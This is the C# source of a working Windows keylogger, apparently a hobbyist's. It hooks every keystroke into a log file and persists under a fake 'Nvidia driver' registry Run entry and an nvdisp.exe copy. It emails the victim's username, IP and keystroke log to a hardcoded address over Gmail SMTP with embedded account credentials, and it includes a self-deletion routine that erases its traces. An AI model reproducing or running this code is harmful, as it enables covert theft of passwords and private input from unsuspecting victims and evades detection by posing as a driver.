using System;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Timers;
using System.Reflection;
using System.Text.RegularExpressions;
namespace ConsoleApplication1
{

    public static class Program
    {
        private static Program.LowLevelKeyboardProc _proc = new Program.LowLevelKeyboardProc(Program.HookCallback);
        private static IntPtr _hookID = IntPtr.Zero;
        public static System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
        public static System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
        private const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 256;
        public static bool doit;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, Program.LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private static void StartEmail()
        {
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    using (MailMessage message = new MailMessage())
                    {
                        message.To.Add("mcdanny420@hotmail.com");
                        message.Subject = "Hacked a guy!";
                        message.From = new MailAddress("keylogdumper@gmail.com");
                        string externalIP="error";
                        try
                        {
                            
                            externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                            externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                                .Matches(externalIP)[0].ToString();

                        }
                        catch { }
                        message.Body = ("Hacked: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name + "\r\n" + "Ip: " + externalIP);
                        SmtpClient smtpClient = new SmtpClient();
                        smtpClient.Credentials = (ICredentialsByHost)new NetworkCredential("keylogdumper@gmail.com", "Keylogdumper3");
                        smtpClient.Port = 587;
                        smtpClient.Host = "smtp.gmail.com";
                        smtpClient.EnableSsl = true;
                        // Attachment attachment = new Attachment(Application.StartupPath + "\\log.txt");
                        //message.Attachments.Add(attachment);
                        smtpClient.Send(message);
                    }
                }
                registryKey.Close();
            }
            catch
            {
                Console.WriteLine("Error doing stuff");
            }
        }
        private static void SetStartup()
        {
            string sourceFileName = Application.ExecutablePath.ToString();
            string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdisp.exe");
            string destFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "nvdisp.exe");
     
            try
            {

                System.IO.File.Copy(sourceFileName, destFileName, false);
                sourceFileName = destFileName;
            }
            catch
            {
                Console.WriteLine("No authorization to copy file or other error.");
            }
            try
            {
               // System.IO.File.Copy(sourceFileName, destFileName2, false);
            }
            catch
            {

            }
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                if (registryKey.GetValue("Nvidia driver") == null)
                    registryKey.SetValue("Nvidia driver", (object)destFileName);
                registryKey.Close();
            }
            catch
            {
                Console.WriteLine("Error setting startup reg key.");
            }
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                if (registryKey.GetValue("Nvidia driver") == null)
                    registryKey.SetValue("Nvidia driver", (object)sourceFileName);
                registryKey.Close();
            }
            catch
            {
                Console.WriteLine("Error setting startup reg key for all users.");
            }
        }
        public static void ClearTrace(){
            try{
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                if (registryKey.GetValue("Nvidia driver") != null)
                    registryKey.DeleteValue("Nvidia driver");
                            string destFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdisp.exe");
            string destFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "nvdisp.exe");
                File.Delete(destFileName);
                File.Delete(destFileName2);
                DeleteMe();
               // Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del " + Application.ExecutablePath);
                Application.Exit();
                Environment.Exit(0);
            }
            catch(Exception e){
                Console.WriteLine(e+" "+e.Message);
            }
        }
        public static void DeleteMe()
        {
            string batchCommands = string.Empty;
            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            batchCommands += "@ECHO OFF\n";                         // Do not show any output
            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
            batchCommands += "echo j | del /F ";                    // Delete the executeable
            batchCommands += exeFileName + "\n";
            batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file

            File.WriteAllText("deleteMyProgram.bat", batchCommands);

            Process.Start("deleteMyProgram.bat");
        }
        private static void timerElapsed2(object sender, EventArgs e)
        {
            //thread = new ClientThread();
        }
        private static void timerElapsed(object sender, EventArgs e)
        {
            if (!Program.doit)
                return;
            else
                Program.doit = false;
            try
            {
               // thread = new ClientThread();
                using (MailMessage message = new MailMessage())
                {
                    message.To.Add("mcdanny420@hotmail.com");
                    message.Subject = "Log: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    message.From = new MailAddress("keylogdumper@gmail.com");
                    message.Body = "Hacked dis guy";
                    SmtpClient smtpClient = new SmtpClient();
                    smtpClient.Credentials = (ICredentialsByHost)new NetworkCredential("keylogdumper@gmail.com", "Keylogdumper3");
                    smtpClient.Port = 587;
                    smtpClient.Host = "smtp.gmail.com";
                    smtpClient.EnableSsl = true;
                    Attachment attachment = new Attachment(Application.StartupPath + "\\log.txt");
                    message.Attachments.Add(attachment);
                    smtpClient.Send(message);
                }
                File.WriteAllText(Application.StartupPath + "\\log.txt", String.Empty);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception in sendEmail:" + ex.Message);
            }
        }
        public static void SendEmail() {
            try
            {

                using (MailMessage message = new MailMessage())
                {
                    message.To.Add("mcdanny420@hotmail.com");
                    message.Subject = "Log: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    message.From = new MailAddress("keylogdumper@gmail.com");
                    message.Body = "Hacked dis guy";
                    SmtpClient smtpClient = new SmtpClient();
                    smtpClient.Credentials = (ICredentialsByHost)new NetworkCredential("keylogdumper@gmail.com", "Keylogdumper3");
                    smtpClient.Port = 587;
                    smtpClient.Host = "smtp.gmail.com";
                    smtpClient.EnableSsl = true;
                    Attachment attachment = new Attachment(Application.StartupPath + "\\log.txt");
                    message.Attachments.Add(attachment);
                    smtpClient.Send(message);
                }
                File.WriteAllText(Application.StartupPath + "\\log.txt", String.Empty);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception in sendEmail:" + ex.Message);
            }
        }
        public static ClientThread thread;
        private static void Main(string[] args)
        {
            //Program.ShowWindow(Program.GetConsoleWindow(), 0);
            StartEmail();
            Program.timer.Interval = 600000;
            Program.timer.Tick += new EventHandler(Program.timerElapsed);
            Program.timer.Start();
         //   Program.timer2.Interval = 30000;
           // Program.timer2.Tick += new EventHandler(Program.timerElapsed2);
           // Program.timer2.Start();
            Program.SetStartup();

            Program._hookID = Program.SetHook(Program._proc);
            thread = new ClientThread();
            Application.Run();
            Program.UnhookWindowsHookEx(Program._hookID);
        }

        private static IntPtr SetHook(Program.LowLevelKeyboardProc proc)
        {

            using (Process currentProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule mainModule = currentProcess.MainModule)
                    return Program.SetWindowsHookEx(13, proc, Program.GetModuleHandle(mainModule.ModuleName), 0U);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            Program.doit = true;
            if (nCode >= 0 && wParam == (IntPtr)256)
            {
                int num = Marshal.ReadInt32(lParam);
                //Console.WriteLine((object) (Keys) num);
                StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\log.txt", true);
                int shift = (Keys.Shift == Control.ModifierKeys) ? 1 : 0;
                int caps = 0;
                switch ((Keys)num)
                {
                    case Keys.Capital:
                        if (caps == 0) caps = 1;
                        else caps = 0;
                        break;
                    case Keys.Space:
                        streamWriter.Write(" ");
                        break;
                    case Keys.Return:
                        streamWriter.WriteLine("");
                        break;
                    case Keys.Back:
                        streamWriter.Write("back");
                        break;
                    case Keys.Tab:
                        streamWriter.Write("tab");
                        break;
                    case Keys.D0:
                        if (shift == 1) streamWriter.Write(")");
                        else streamWriter.Write("0");
                        break;
                    case Keys.D1:
                        if (shift == 1) streamWriter.Write("!");
                        else streamWriter.Write("1");
                        break;
                    case Keys.D2:
                        if (shift == 1) streamWriter.Write("@");
                        else streamWriter.Write("2");
                        break;
                    case Keys.D3:
                        if (shift == 1) streamWriter.Write("#");
                        else streamWriter.Write("3");
                        break;
                    case Keys.D4:
                        if (shift == 1) streamWriter.Write("$");
                        else streamWriter.Write("4");
                        break;
                    case Keys.D5:
                        if (shift == 1) streamWriter.Write("%");
                        else streamWriter.Write("5");
                        break;
                    case Keys.D6:
                        if (shift == 1) streamWriter.Write("^");
                        else streamWriter.Write("6");
                        break;
                    case Keys.D7:
                        if (shift == 1) streamWriter.Write("&");
                        else streamWriter.Write("7");
                        break;
                    case Keys.D8:
                        if (shift == 1) streamWriter.Write("*");
                        else streamWriter.Write("8");
                        break;
                    case Keys.D9:
                        if (shift == 1) streamWriter.Write("(");
                        else streamWriter.Write("9");
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Apps:
                        streamWriter.Write("");
                        break;

                    case Keys.OemQuestion:
                        if (shift == 0) streamWriter.Write("/");
                        else streamWriter.Write("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (shift == 0) streamWriter.Write("[");
                        else streamWriter.Write("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (shift == 0) streamWriter.Write("]");
                        else streamWriter.Write("}");
                        break;
                    case Keys.Oem1:
                        if (shift == 0) streamWriter.Write(";");
                        else streamWriter.Write(":");
                        break;
                    case Keys.Oem7:
                        if (shift == 0) streamWriter.Write("'");
                        else streamWriter.Write('"');
                        break;
                    case Keys.Oemcomma:
                        if (shift == 0) streamWriter.Write(",");
                        else streamWriter.Write("<");
                        break;
                    case Keys.OemPeriod:
                        if (shift == 0) streamWriter.Write(".");
                        else streamWriter.Write(">");
                        break;
                    case Keys.OemMinus:
                        if (shift == 0) streamWriter.Write("-");
                        else streamWriter.Write("_");
                        break;
                    case Keys.Oemplus:
                        if (shift == 0) streamWriter.Write("=");
                        else streamWriter.Write("+");
                        break;
                    case Keys.Oemtilde:
                        if (shift == 0) streamWriter.Write("`");
                        else streamWriter.Write("~");
                        break;
                    case Keys.Oem5:
                        streamWriter.Write("|");
                        break;

                    default:
                        if (shift == 0 && caps == 0) streamWriter.Write(((Keys)num).ToString().ToLower());
                        if (shift == 1 && caps == 0) streamWriter.Write(((Keys)num).ToString().ToUpper());
                        if (shift == 0 && caps == 1) streamWriter.Write(((Keys)num).ToString().ToUpper());
                        if (shift == 1 && caps == 1) streamWriter.Write(((Keys)num).ToString().ToLower());
                        break;
                };
                streamWriter.Close();
            }
            return Program.CallNextHookEx(Program._hookID, nCode, wParam, lParam);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
}
